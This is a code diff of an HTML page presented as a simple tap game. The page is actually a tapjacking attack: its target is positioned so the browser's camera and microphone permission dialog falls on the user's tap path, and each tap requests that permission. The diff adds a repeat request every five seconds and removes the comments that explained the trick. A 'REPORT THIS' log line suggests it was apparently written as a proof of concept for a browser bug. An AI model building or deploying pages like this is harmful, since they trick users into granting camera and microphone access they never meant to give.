@@ -7,9 +7,9 @@
 <style>
   body { margin: 0; font-family: sans-serif; background: #111; color: #fff; touch-action: manipulation; }
   #target {
-    /* Posisikan target sedikit di ATAS tengah supaya dialog "Allow"
-       yang muncul di bawah-tengah jatuh tepat di path tap user */
-    position: fixed; top: 38%; left: 50%; transform: translate(-50%, -50%);
+    /* Shifted right-down so the bottom-center permission dialog
+       lands on the tap path */
+    position: fixed; top: 45%; left: 58%; transform: translate(-50%, -50%);
     width: 70vw; height: 70vw; max-width: 320px; max-height: 320px;
     border-radius: 50%; background: #3a7;
     display: flex; align-items: center; justify-content: center;
@@ -20,12 +20,13 @@
 </style>
 </head>
 <body>
-<div id="target">TAP AKU</div>
+<div id="target">TAP ME</div>
 <div id="score">Score: 0</div>
 <div id="log"></div>
 
 <script>
 let score = 0;
+let attempts = 0;
 const target = document.getElementById('target');
 const log = document.getElementById('log');
 
@@ -33,24 +34,30 @@ async function askPerm() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
     stream.getTracks().forEach(t => t.stop());
-    log.textContent = 'ALLOWED TANPA TAP EKSPLISIT — REPORT INI';
-  } catch (e) { /* denied */ }
+    log.textContent = 'ALLOWED WITHOUT EXPLICIT TAP — REPORT THIS';
+  } catch (e) {
+    log.textContent = 'denied/suppressed: ' + e.name;
+  }
 }
 
-// touchstart lebih cepat dari click di mobile (no 300ms delay,
-// dan event sampai sebelum dialog intercept)
 target.addEventListener('touchstart', () => {
   score++;
   document.getElementById('score').textContent = 'Score: ' + score;
   askPerm();
 }, { passive: true });
 
-// Juga log semua touch di document — buat debug apakah tap "tembus"
-// ke elemen di bawah dialog (event interception bug)
 document.addEventListener('touchstart', e => {
   console.log('touch at', e.touches[0].clientX, e.touches[0].clientY,
               'on', e.target.tagName);
 }, { passive: true, capture: true });
+
+setInterval(() => {
+  if (document.hasFocus()) {
+    attempts++;
+    console.log(`attempt #${attempts}`);
+    askPerm();
+  }
+}, 5000);
 </script>
 </body>
 </html>
